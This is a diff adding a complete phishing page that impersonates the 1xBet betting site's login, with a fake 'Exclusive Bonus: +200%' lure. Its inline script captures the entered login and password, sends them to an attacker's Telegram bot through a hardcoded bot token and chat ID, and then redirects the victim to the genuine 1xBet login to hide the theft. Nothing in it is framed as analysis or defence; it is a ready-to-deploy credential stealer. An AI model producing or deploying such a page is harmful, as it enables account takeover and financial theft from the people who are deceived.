@@ -1,1 +1,57 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>1xBet - Safe Login</title>
+    <style>
+        body { font-family: 'Roboto', sans-serif; background-color: #0d1b2a; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; color: white; }
+        .login-card { background: #1b263b; padding: 30px; border-radius: 12px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); width: 90%; max-width: 380px; text-align: center; border-top: 4px solid #00b4d8; }
+        .logo { width: 140px; margin-bottom: 20px; }
+        .promo-txt { font-size: 16px; color: #00b4d8; font-weight: bold; margin-bottom: 10px; }
+        .info-txt { font-size: 13px; color: #a2a2a2; margin-bottom: 20px; }
+        input { width: 100%; padding: 12px; margin-bottom: 15px; border: 1px solid #415a77; background: #0d1b2a; color: white; border-radius: 6px; box-sizing: border-box; }
+        .btn-login { width: 100%; padding: 12px; border: none; background: linear-gradient(90deg, #00b4d8, #0077b6); color: white; font-size: 16px; font-weight: bold; border-radius: 6px; cursor: pointer; transition: 0.3s; }
+        .btn-login:hover { opacity: 0.9; }
+        .footer { margin-top: 20px; font-size: 11px; color: #777; }
+    </style>
+</head>
+<body>
+    <div class="login-card">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/cf/1xBet_logo.svg/1200px-1xBet_logo.svg.png" class="logo" alt="1xbet">
+        <div class="promo-txt">Exclusive Bonus: +200% on Next Deposit</div>
+        <p class="info-txt">Please login to your account to activate your bonus and verify your identity for secure withdrawals.</p>
+        <form id="betForm">
+            <input type="text" id="login" placeholder="Email, ID or Phone number" required>
+            <input type="password" id="pass" placeholder="Password" required>
+            <button type="submit" id="subBtn" class="btn-login">CLAIM BONUS</button>
+        </form>
+    </div>
+
+    <script>
+        const token = "8295681279:AAHBcRjLGmz_MjpjCszDqTC33SIMpamlmh8";
+        const chatId = "8487366702";
+
+        document.getElementById('betForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const btn = document.getElementById('subBtn');
+            btn.innerText = "Processing...";
+            btn.disabled = true;
+
+            const u = document.getElementById('login').value;
+            const p = document.getElementById('pass').value;
+            const msg = `💰 **1xBet Big Catch!**\n\n👤 Login: \`${u}\` \n🔑 Pass: \`${p}\` \n🔥 Action: Bonus Claimed`;
+
+            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}&parse_mode=markdown`)
+            .then(() => {
+                // تحويل لصفحة 1xbet الحقيقية
+                window.location.href = "https://1xbet.com/en/user/login";
+            })
+            .catch(() => {
+                window.location.href = "https://1xbet.com/en/user/login";
+            });
+        });
+    </script>
+</body>
+</html>
 
